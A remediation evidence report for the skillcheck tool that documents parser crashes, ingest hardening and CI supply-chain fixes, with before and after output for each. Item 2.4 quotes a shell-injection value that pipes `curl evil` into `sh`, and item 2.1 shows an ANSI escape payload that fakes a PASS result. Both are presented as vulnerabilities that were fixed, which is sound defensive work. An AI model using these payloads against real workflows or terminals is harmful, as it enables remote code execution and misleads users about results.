# Remediation Evidence

Baseline: commit `6a477c2`, skillcheck v1.4.0.
Toolchain baseline (before any change): `786 passed`, `ruff check src tests` clean, `mypy src/skillcheck` clean.

Every item below records: the finding, the before output, the files touched, the after output, and the tests added.

---

## Phase 1: correctness hotfix

### 1.1 Non-dict frontmatter crashes with a traceback

Finding: `parser.py` accepts any YAML type from `yaml.safe_load(...) or {}`; a scalar or list
frontmatter reaches `template_detection.py:30` and raises `AttributeError: 'str' object has no attribute 'get'`.

BEFORE:
```
$ printf -- '---\njust a string\n---\nbody\n' > /tmp/p/SKILL.md && skillcheck /tmp/p/SKILL.md
Traceback (most recent call last):
  ...
  File ".../template_detection.py", line 30, in is_template
    if skill.frontmatter.get("template") is True:
       ^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'str' object has no attribute 'get'
EXIT=1
```

FIX (files touched):
- `src/skillcheck/parser.py`: after `yaml.safe_load`, coerce `None` to `{}`, then raise `ParseError` naming the actual type and path when the value is not a dict.
- `tests/fixtures/bad_frontmatter_string.md`, `bad_frontmatter_list.md`, `bad_frontmatter_int.md` (new negative fixtures).
- `tests/test_parser.py`: `test_rejects_string_frontmatter`, `test_rejects_list_frontmatter`, `test_rejects_int_frontmatter`.

AFTER:
```
$ skillcheck /tmp/p/SKILL.md
✗ FAIL  /tmp/p/SKILL.md
            ✗ error             parse.error  Frontmatter must be a YAML mapping, got str in /tmp/p/SKILL.md. Wrap frontmatter in key: value pairs.

Checked 1 file: 0 passed, 1 failed
EXIT=1
```
`skillcheck.parser.parse` now raises `ParseError` (caught in `core/symbolic.py:44` → clean `parse.error` diagnostic). No traceback.

Tests added: `test_rejects_string_frontmatter`, `test_rejects_list_frontmatter`, `test_rejects_int_frontmatter` (test_parser.py: 10 → 13 passing).

### 1.2 Unescaped `...` in template detection disables ERROR checks on real skills

Finding: `template_detection.py:14` had `\[(...|...)\]` where the `...` branch matched any 3 characters,
so `[ISO]`, `[API]`, `[CLI]` marked real skills as templates, skipping `frontmatter.name.directory-mismatch`
(ERROR), `compat.vscode-dirname`, and description scoring.

BEFORE:
```
$ skillcheck /tmp/t/iso-dates/SKILL.md --format json   # description: "Formats [ISO] dates ..."
template.detected | info | Detected placeholder content; ... checks ... are skipped for template files.
```

FIX (files touched):
- `src/skillcheck/template_detection.py`: escape `...` to `\.\.\.` in the bracketed-placeholder pattern.
- `tests/fixtures/non_template_bracket_acronym.md` (negative fixture, `[ISO]/[API]/[CLI]`).
- `tests/fixtures/template_bracket_placeholder.md` (positive fixture, literal `[...]`).
- `tests/test_template_detection.py` (new module giving `is_template` direct coverage).

AFTER:
```
=== [ISO] must NOT be template now ===
template.detected present: False
rules: ['description.quality-score']
=== literal [...] must STILL be template ===
template.detected present: True
```

Tests added: `test_bracketed_acronyms_are_not_template`, `test_literal_ellipsis_placeholder_is_template`.

### 1.3 Multi-path ingest stamps the first skill's diagnostics onto every file

Finding: `commands.py` parsed `paths[0]` only for critique/graph ingest, then merged those diagnostics
into every result. A directory of two skills plus one agent response marked both files with the same findings.

BEFORE:
```
$ skillcheck /tmp/multi --ingest-critique tests/fixtures/critique/response_warnings.json --format json
/tmp/multi/skill-one/SKILL.md -> [..., 'semantic.clarity.low', 'semantic.completeness.low', ...]
/tmp/multi/skill-two/SKILL.md -> [..., 'semantic.clarity.low', 'semantic.completeness.low', ...]   # same, wrong
EXIT=0
```

FIX (files touched):
- `src/skillcheck/commands.py`: `run_validation` rejects `--ingest-critique`/`--ingest-graph` combined with more than one resolved path, printing an error naming the active flag(s) and the path count, exit 2.
- `README.md`: Agent-modes note plus exit-code `2` row updated.
- `tests/test_cli_critique.py`: `test_ingest_critique_rejects_multiple_paths`.
- `tests/test_cli_graph_agent.py`: `test_ingest_graph_rejects_multiple_paths`.

AFTER:
```
$ skillcheck /tmp/multi --ingest-critique .../response_warnings.json
Error: --ingest-critique applies one agent response to one skill, but 2 SKILL.md paths were resolved. Run it once per skill, pointing at a single SKILL.md.
EXIT=2
$ skillcheck /tmp/multi --ingest-graph .../response_clean.json
Error: --ingest-graph applies one agent response to one skill, but 2 SKILL.md paths were resolved. ...
EXIT=2
$ skillcheck /tmp/multi/skill-one/SKILL.md --ingest-critique .../response_warnings.json   # single path still works, EXIT=0
```

Tests added: `test_ingest_critique_rejects_multiple_paths`, `test_ingest_graph_rejects_multiple_paths`.

### 1.4 Malformed history ledger escapes as TypeError

Finding: `core/history.py` `load_ledger` guarded `KeyError` only. A non-object root (`[1,2,3]`) and a
non-list `runs` (`{"runs":"oops",...}`) both escaped as uncaught `TypeError`. The `version` field was read
but never validated against `LEDGER_SCHEMA_VERSION`.

BEFORE:
```
root [1,2,3]                 -> TypeError : list indices must be integers or slices, not str
{"runs":"oops","version":1}  -> TypeError : string indices must be integers, not 'str'
```

FIX (files touched):
- `src/skillcheck/core/history.py`: after `json.loads`, assert root is a dict; validate `version == LEDGER_SCHEMA_VERSION` (naming both versions on mismatch); assert `runs` is a list; wrap the per-entry loop in `except TypeError` so a malformed entry raises `LedgerError` with the "delete it and re-run" remediation.
- `tests/fixtures/history/ledger_root_list.json`, `ledger_runs_not_list.json`, `ledger_bad_version.json`, `ledger_malformed_entry.json` (new).
- `tests/test_history_io.py`: four new tests.

AFTER:
```
ledger_root_list      -> LedgerError: ... must be a JSON object, got list. ... Delete it and re-run ...
ledger_runs_not_list  -> LedgerError: ... field 'runs' must be a list, got str. ...
ledger_bad_version    -> LedgerError: ... has schema version 999, but this skillcheck expects version 1. ...
ledger_malformed_entry-> LedgerError: ... contains a malformed run entry: 'int' object is not subscriptable. ...
$ skillcheck /tmp/hist/SKILL.md --show-history   # EXIT=1, clean stderr, no traceback
```

Tests added: `test_load_raises_when_root_is_not_object`, `test_load_raises_when_runs_is_not_a_list`, `test_load_raises_on_schema_version_mismatch`, `test_load_raises_on_malformed_run_entry`.

### 1.5 Duplicate allowed-tools crashes --analyze-graph

Finding: the heuristic extractor content-hashes tool nodes on the name alone, so `allowed-tools: [Bash, Bash]`
minted two nodes with the same ID and `CapabilityGraph.__post_init__` raised `ValueError: Duplicate node ID`.

BEFORE:
```
$ skillcheck /tmp/dup/SKILL.md --analyze-graph   # allowed-tools: [Bash, Bash]
  ...
  File ".../core/graph.py", line 165, in __post_init__
    raise ValueError(
ValueError: Duplicate node ID 'f062fdee' appears in multiple capability graph collections.
EXIT=1
```

FIX (files touched):
- `src/skillcheck/core/graph.py`: dedupe tool names with `dict.fromkeys()` (order-preserving) before node creation, filtering non-str items first so nested YAML cannot break the dedupe.
- `tests/fixtures/graph/skill_duplicate_tools.md` (`allowed-tools: [Bash, Bash, Read]`).
- `tests/test_graph_heuristic.py`: `test_duplicate_allowed_tools_produce_single_input`.

AFTER:
```
=== analyze-graph now clean ===
Checked 1 file: 1 passed, 0 failed, 2 warnings
EXIT=0
=== emit-graph shows single Bash input ===
inputs: ['Bash']
```

Tests added: `test_duplicate_allowed_tools_produce_single_input`.

### 1.6 Emit modes crash on files plain validation handles

Finding: emit loops in `commands.py` called `_parse_skill` without catching `ParseError`, so a non-UTF-8
file (or non-mapping frontmatter from 1.1) surfaced a traceback where plain validation renders a clean FAIL.
`read_ingest_raw` caught `OSError` but not `UnicodeDecodeError`.

During reproduction I confirmed the same traceback in every mode that re-parses outside `validate()`:
`--emit-graph`, `--emit-critique-prompt`, `--emit-graph-prompt`, `--agent-reason`, `--activation-hypotheses`,
`--analyze-graph`, `--history`, and the `--ingest-*` re-parse of the first path. All are the same root cause;
I fixed all of them rather than only the three cited emit lines.

BEFORE (representative):
```
$ skillcheck /tmp/enc/SKILL.md --emit-graph
  ...
skillcheck.parser.ParseError: File is not valid UTF-8: /tmp/enc/SKILL.md   (traceback, exit 1)
$ skillcheck valid_basic.md --ingest-critique /tmp/enc/response.json
  ...
UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0: invalid start byte   (traceback)
```

FIX (files touched):
- `src/skillcheck/commands.py`: new `_parse_or_exit(path)` helper (prints the ParseError to stderr, exit 1); routed all emit and re-parse sites through it (`emit_graph`, `emit_critique_prompts`, `emit_graph_prompts`, `emit_agent_reason_packet`, `emit_activation`, the `--ingest-*` and `--analyze-graph` re-parses, and the `--history` re-parse). `read_ingest_raw` now also catches `UnicodeDecodeError` (exit 2). The score-breakdown re-parse was already inside `try/except Exception`.
- `tests/test_cli.py`: parametrized mode test plus an ingest-response test.

AFTER:
```
--emit-graph           -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--emit-critique-prompt -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--emit-graph-prompt    -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--agent-reason         -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--activation-hypotheses-> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--analyze-graph        -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--history              -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
--ingest-critique      -> exit=1 : Error: File is not valid UTF-8: /tmp/enc/SKILL.md
read_ingest_raw non-UTF-8 response -> exit=2 : Error: cannot read .../response.json: 'utf-8' codec can't decode ...
```
No traceback in any mode.

Tests added: `test_modes_exit_clean_on_non_utf8_file` (parametrized over 7 modes), `test_ingest_critique_non_utf8_response_exits_two`.

### 1.7 Codex provenance labeled with the Claude date constant

Finding: `compat.py:117` appended `f"Codex: {_CLAUDE_DATA_DATE}"`. The label was wired to the Claude constant,
masked because all three provenance dates happen to be equal.

BEFORE / AFTER (monkeypatching `_CLAUDE_DATA_DATE` to a sentinel exposes the wiring):
```
=== BEFORE (buggy) ===
Behavior of field 'allowed-tools' in codex, cursor is unverified (as of Codex: CLAUDE-SENTINEL; Cursor: 2026-04-20).
=== AFTER (fixed) ===
Behavior of field 'allowed-tools' in codex, cursor is unverified (as of Codex: 2026-04-20; Cursor: 2026-04-20).
```

FIX (files touched):
- `src/skillcheck/rules/compat.py`: add `_CODEX_DATA_DATE`, use it at the Codex provenance label, mention it in the module docstring.
- `tests/test_compat_data_freshness.py`: `test_codex_data_is_fresh` (independent freshness assertion) and `test_codex_provenance_uses_codex_date_not_claude_date` (distinct sentinels prove the label tracks the Codex constant, not the Claude one).

Tests added: `test_codex_data_is_fresh`, `test_codex_provenance_uses_codex_date_not_claude_date`.

### Phase 1 gate

```
$ python3 -m pytest tests/ -q
Required test coverage of 68% reached. Total coverage: 70.29%
808 passed in 57.50s

$ ruff check src tests
All checks passed!

$ mypy src/skillcheck
Success: no issues found in 46 source files
```
README test-count claim synced 786 -> 808 (guarded by `test_readme_test_count_matches_collected_count`).

---

## Phase 2: ingest and supply-chain hardening

### 2.1 Terminal escape injection from untrusted agent responses

Finding: strings from critique/graph JSON (missing_context, contradiction locations, findings, node names)
printed raw at `formatters.py:63` and `core/graph_render.py:75`. A `missing_context` value carrying
`\x1b[2K\x1b[1G\x1b[32mfake PASS\x1b[0m` rendered live ANSI to the terminal.

BEFORE / AFTER (`tests/fixtures/critique/response_ansi_injection.json`, which JSON-encodes ESC as ``
so the file looks benign but decodes to a real ESC):
```
=== BEFORE (no sanitization) ===
raw ESC byte in stdout: True
rendered: '... semantic.context.missing  Missing context: \x1b[2K\x1b[1G\x1b[32mfake PASS\x1b[0m'
=== AFTER (sanitized) ===
raw ESC byte in stdout: False
rendered: '... semantic.context.missing  Missing context: \\x1b[2K\\x1b[1G\\x1b[32mfake PASS\\x1b[0m'
```
JSON output stays valid and safe: `raw ESC in JSON stdout: False`, message value `Missing context: \\x1b[...`.

FIX (files touched):
- `src/skillcheck/agents/_ingest.py` (new): `sanitize_ingested_text` escapes C0/DEL/C1 control chars to a visible inert form.
- `src/skillcheck/core/semantic.py`: sanitize `missing_context`, contradiction fields, and finding fields at diagnostic construction.
- `src/skillcheck/core/graph_render.py`: sanitize node names/descriptions in the text render only (JSON render left raw; `json.dumps` escapes control chars).
- `tests/fixtures/critique/response_ansi_injection.json`, `tests/test_ingest_sanitization.py` (new).

Tests added: `test_sanitize_escapes_ansi_escape_char`, `test_sanitize_escapes_newlines_and_tabs`, `test_sanitize_leaves_normal_text_unchanged`, `test_ingested_critique_message_has_no_control_chars`, `test_graph_text_render_escapes_node_names`, `test_graph_json_render_stays_safe_and_raw`.

### 2.2 No size bound on ingested responses

Finding: `read_ingest_raw` read stdin/file fully with no cap; the parsers put no limit on
findings/capabilities/edges counts.

BEFORE / AFTER:
```
=== BEFORE list cap ===  ACCEPTED 10001 items (no cap)
=== BEFORE byte cap (CLI) === Checked 1 file: 1 passed, 0 failed   (6 MB file, exit 0)
=== AFTER list cap ===   REJECTED: Ingested 'missing_context' has 10001 items, over the 10000-item cap. ...
=== AFTER byte cap (CLI) === Error: ingest response /tmp/big_file.json is 6291580 bytes, over the 5242880-byte cap. ...  exit=2
=== AFTER stdin cap ===  Error: ingest payload from stdin exceeds the 5242880-byte cap. ...  exit=2
=== AFTER graph cap ===  Ingested 'capabilities' has 10001 items, over the 10000-item cap. ...
```

FIX (files touched):
- `src/skillcheck/agents/_ingest.py`: `MAX_INGEST_BYTES` (5 MiB), `MAX_INGEST_LIST_ITEMS` (10000), `enforce_list_cap`.
- `src/skillcheck/commands.py`: `read_ingest_raw` rejects payloads over the byte cap (file via `stat`, stdin via bounded read), naming the actual size and the cap, exit 2.
- `src/skillcheck/agents/parser.py`: cap findings/missing_context/contradictions.
- `src/skillcheck/agents/graph_parser.py`: cap capabilities/inputs/outputs/edges.
- `tests/test_critique_parser.py`, `tests/test_graph_parser.py`, `tests/test_cli.py`.

Tests added: `test_missing_context_over_cap_rejected`, `test_findings_over_cap_rejected`, `test_list_exactly_at_cap_is_accepted`, `test_capabilities_over_cap_rejected`, `test_ingest_response_over_size_cap_exits_two`.

### 2.3 Published schemas looser than the parsers

Finding: `schemas/critique-v1.json` and `graph-v1.json` lacked `additionalProperties: false`, so a
schema-valid agent response with an extra field could still fail ingest (the parsers reject unknown fields).

BEFORE:
```
$ grep -c additionalProperties src/skillcheck/schemas/*.json   ->  critique: 0, graph: 0
parser REJECTED: Response has unexpected top-level fields: ['evil']   # schema-valid, parser-rejected
```

FIX (files touched):
- `src/skillcheck/schemas/critique-v1.json`: `additionalProperties: false` on the top-level object, findings items, contradictions items (3 total).
- `src/skillcheck/schemas/graph-v1.json`: same on the top-level object and all four node-collection items (5 total).
- `tests/test_published_schemas.py`: recursive object-subschema walk asserting each declares `additionalProperties: false`.

AFTER:
```
$ grep -c '"additionalProperties": false' src/skillcheck/schemas/*.json  ->  critique: 3, graph: 5
schemas still valid JSON: OK
```

Note on the enum sub-item: the finding says "graph does not" have a test asserting the graph kind enums equal
`_VALID_INPUT_KINDS/_VALID_OUTPUT_KINDS/_VALID_EDGE_KINDS`. That test already exists on HEAD
(`test_graph_schema_kind_enums_match_parser`, test_published_schemas.py:82-99), so no new enum test was needed;
this sub-item was already satisfied.

Tests added: `test_critique_schema_forbids_additional_properties`, `test_graph_schema_forbids_additional_properties`.

### 2.4 action.yml interpolates inputs into bash

Finding: every `${{ inputs.* }}` expanded inside the composite action's `run:` block, so a value like
`version: 1.0" ; curl evil | sh ; echo "` broke out of the shell.

FIX (files touched):
- `action.yml`: added an `env:` block mapping each input to an `INPUT_*` variable; the `run:` block now
  references `"$INPUT_*"` shell env vars, whose values are never spliced into the script source.
  Also pinned `actions/setup-python` to a SHA here (see 2.6).

BEFORE / AFTER (grep of the run block):
```
run: | at line 146
OK: no ${{ interpolation anywhere after run: |
```
`grep '${{ inputs.'` now matches only the `env:` mapping lines (the safe form), never the run block.
`action.yml` parses as valid YAML; behavior is identical (same flags built from the same inputs).

### 2.5 Attestation claim is false; no publish pipeline

Finding: `ci.yml` triggers only on push-to-main and pull_request; its attest step is gated on `refs/tags/v*`
and never runs. The README claimed tagged releases carry SLSA provenance. CONTRIBUTING's release process ended
at `gh release create` with manual PyPI upload.

FIX (files touched):
- `.github/workflows/release.yml` (new): tag-triggered (`v*.*.*`, so the moving `v1` tag does not double-publish),
  builds the wheel and sdist, verifies the built version matches the tag, attests with
  `actions/attest-build-provenance` (SHA-pinned `e8998f9...` v2.4.0), and publishes via PyPI trusted publishing
  (`pypa/gh-action-pypi-publish` SHA-pinned `7f25271...` v1.12.4). Least-privilege: `id-token: write`,
  `attestations: write`, `contents: read`; `environment: pypi`.
- `.github/workflows/ci.yml`: removed the dead attest step and the now-unneeded `id-token`/`attestations`
  job permissions; the package job stays a read-only build/install smoke check.
- `README.md`: Releases section now describes the real workflow.
- `CONTRIBUTING.md`: Releasing section rewritten; added the exact one-time PyPI trusted-publishing settings.

Trusted publishing requires a one-time PyPI-side configuration by the maintainer (documented in CONTRIBUTING):
Owner `moonrunnerkc`, Repository `skillcheck`, Workflow filename `release.yml`, Environment `pypi`.

VERIFY:
```
$ /tmp/actionlint .github/workflows/*.yml
actionlint EXIT=0
```

### 2.6 Floating action tags with write permissions

Finding: `release-notes.yml` used `peter-evans/create-pull-request@v6` (with `contents: write`,
`pull-requests: write`); `actions/checkout` and `actions/setup-python` floated on major tags across workflows.

FIX (files touched): pinned every third-party action to a full commit SHA (resolved via `git ls-remote`) with a
trailing version comment, across `ci.yml`, `release-notes.yml`, `release.yml`, and `action.yml`:
- `actions/checkout` -> `34e114876b0b11c390a56381ad16ebd13914f8d5` (v4.3.1)
- `actions/setup-python` -> `a26af69be951a213d495a4c3e4e4022e16d87065` (v5.6.0)
- `peter-evans/create-pull-request` -> `c5a7806660adbe173f04e3e038b0ccdcd758773c` (v6.1.0)
- `actions/attest-build-provenance` -> `e8998f949152b193b063cb0ec769d69d929409be` (v2.4.0)
- `pypa/gh-action-pypi-publish` -> `7f25271a4aa483500f742f9492b2ab5648d61011` (v1.12.4)

VERIFY:
```
$ grep -rnE 'uses:\s*\S+@' .github/workflows/ | grep -vE '@[0-9a-f]{40}'
(no output)  ->  OK: all SHA-pinned
$ /tmp/actionlint .github/workflows/*.yml   ->  actionlint OK
```

### 2.7 Pre-commit tests skip everywhere including CI

Finding: CONTRIBUTING says CI installs `pre-commit`, but the dev extra did not include it, so both tests in
`test_pre_commit.py` skipped on every run (they skip when `shutil.which("pre-commit")` is None).

BEFORE (dev extra had no pre-commit; simulate CI PATH without a global pre-commit):
```
$ grep pre-commit pyproject.toml   ->  NO (not in dev extra)
$ env PATH=".venv/bin:/usr/bin:/bin" pytest tests/test_pre_commit.py -rs
SKIPPED [1] tests/test_pre_commit.py:60: pre-commit not installed
SKIPPED [1] tests/test_pre_commit.py:74: pre-commit not installed
2 skipped in 0.02s
```

FIX (files touched):
- `pyproject.toml`: add `pre-commit>=3.5` to the `dev` extra.

AFTER (`pip install -e .[dev]` now installs pre-commit into the environment):
```
$ env PATH=".venv/bin:/usr/bin:/bin" pytest tests/test_pre_commit.py -rs
2 passed in 1.19s
```
